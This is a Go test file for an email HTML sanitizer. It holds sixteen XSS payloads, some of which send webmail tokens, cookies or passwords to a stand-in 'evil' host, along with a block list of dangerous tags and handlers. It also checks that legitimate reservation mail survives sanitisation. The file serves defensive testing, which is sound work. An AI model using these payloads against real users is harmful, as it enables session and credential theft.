package main

import "testing"

var attacks = []struct{ name, in string }{
	{"script tag", `<p>hi</p><script>fetch('//evil/'+localStorage.webmail_token)</script>`},
	{"img onerror", `<img src=x onerror="fetch('//evil/'+document.cookie)">`},
	{"svg onload", `<svg/onload=alert(1)>`},
	{"javascript href", `<a href="javascript:alert(1)">click</a>`},
	{"iframe", `<iframe src="https://evil.example/"></iframe>`},
	{"style expression", `<div style="background:url(javascript:alert(1))">x</div>`},
	{"style block", `<style>body{background:url('//evil/beacon')}</style><p>t</p>`},
	{"form phish", `<form action="//evil/"><input name=pw type=password></form>`},
	{"body onload", `<body onload=alert(1)><p>t</p></body>`},
	{"meta refresh", `<meta http-equiv="refresh" content="0;url=//evil/">`},
	{"base tag", `<base href="//evil/">`},
	{"object", `<object data="//evil/x.swf"></object>`},
	{"onmouseover", `<div onmouseover="alert(1)">hover</div>`},
	{"data uri script", `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>`},
	{"nested obfuscation", `<img src="x" OnErRoR="alert(1)">`},
	{"srcdoc", `<iframe srcdoc="<script>alert(1)</script>"></iframe>`},
}

func TestSanitizerBlocksXSS(t *testing.T) {
	bad := []string{"<script", "onerror", "onload", "javascript:", "<iframe", "<form",
		"<object", "onmouseover", "<style", "<meta", "<base", "srcdoc"}
	for _, a := range attacks {
		got := sanitizeEmailHTML(a.in)
		for _, b := range bad {
			if containsFold(got, b) {
				t.Errorf("%s: %q survived in %q", a.name, b, got)
			}
		}
	}
}

func TestSanitizerKeepsLegitimateMail(t *testing.T) {
	in := `<div style="color:#333;font-size:14px"><h1>Réservation</h1>` +
		`<p>Bonjour <b>Florence</b>,</p><table border="1"><tr><td>Juillet</td></tr></table>` +
		`<a href="https://lacure.enbauges.fr/devis">Voir le devis</a>` +
		`<img src="https://lacure.enbauges.fr/logo.png" width="100"></div>`
	got := sanitizeEmailHTML(in)
	for _, want := range []string{"Réservation", "Florence", "<table", "Juillet",
		"https://lacure.enbauges.fr/devis", "logo.png", "color:", "<b>"} {
		if !containsFold(got, want) {
			t.Errorf("lost %q from legitimate mail: %q", want, got)
		}
	}
}

func containsFold(h, n string) bool {
	hl, nl := []rune(lower(h)), []rune(lower(n))
	for i := 0; i+len(nl) <= len(hl); i++ {
		ok := true
		for j := range nl {
			if hl[i+j] != nl[j] {
				ok = false
				break
			}
		}
		if ok {
			return true
		}
	}
	return false
}

func lower(s string) string {
	b := []rune(s)
	for i, r := range b {
		if r >= 'A' && r <= 'Z' {
			b[i] = r + 32
		}
	}
	return string(b)
}
